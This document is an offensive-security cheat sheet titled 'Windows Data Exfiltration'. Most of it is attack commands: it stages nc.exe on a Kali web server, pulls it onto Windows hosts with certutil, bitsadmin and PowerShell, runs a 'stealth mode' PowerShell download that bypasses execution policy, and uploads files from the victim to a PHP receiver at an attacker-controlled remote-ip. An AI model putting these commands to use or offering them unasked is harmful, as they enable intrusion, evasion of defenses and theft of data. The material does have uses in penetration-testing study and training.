# Windows Data Exfiltration

* Use kali linux NC windows binary
* Locate file transfer utilities on Windows systems
* Download a file using certutil
* Download a file using bitsadmin
* Download a file with PowerShell
* Upload a file with PowerShell

## Use kali linux NC windows binary

```bash
sudo cp /usr/share/windows-binaries/nc.exe /var/www/html/
```

## FreeRSD - A Free Remote Desktop Protocol

* +clipboard
* /v: server

```bash
xfreerdp +clipboard /u:user /p:password /v:remote-ip
```

## Download a file using certutil

* We can also use this to download remote files.
* But: Certutil is blocked by Windows Security Antivirus rules.
* -urlcache
* -f file url 

```powershell
C:\Users\user> cd Downloads
certutil -urlcache -split -f http://kali-ip/nc.exe nc.exe
```

## Downlaod a file using bitsadmin

```powershell
bitsadmin /create DownloadJob
bitsadmin /addfile DownloadJob http://kali-ip/nc.exe C:\Users\user\Downloads\nc.exe
bitsadmin /resume DownloadJob
bitsadmin /complete DownloadJob
bitsadmin /info DownloadJob /verbose
```

## Downlaod a file using powershell

```powershell
(New-Object Net.WebClient).DownloadFile('http://remote-ip/nc.exe', 'nc.exe')

wget http://remote-ip/nc.exe -o nc.exe

Invoke-WebRequest -Uri 'http://remote-ip/nc.exe' -OutFile 'nc.exe'
Invoke-WebRequest -Uri 'http://remote-ip/nc.exe' -OutFile 'nc.exe' -proxy "http://proxy.contoso.com:8080
```

## Downlaod a file using powershell script with stealth mode

* Bypass security policy and default profiel
* -ExecutionPolicy Bypass
* -NoProfile

* Stealth mode
* -NonInteractive
* -NoLogo

```powershell
type .\wget.ps1
$webclient = New-Object System.Net.WebClient
$url = "http://remote-ip/nc.exe"
$dst = "nc.exe"
$webclient.DownloadFile($url,$dst)

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File .\wget.ps1
```

## Upload File with powershell

* '$' must be escaped in bash scripts
* \$

```bash
cat psupload.php
<?php 
$uploaddir = '/var/www/html/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
if(move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile))
    echo "Upload done.";
else
    echo "Upload error!";
?>
```

```powershell
powershell $response=(New-Object Net.WebClient).UploadFile('http://remote-ip/psupload.php', '.\Upload.txt'); [Text.Encoding]::UTF8.GetString($response)
```
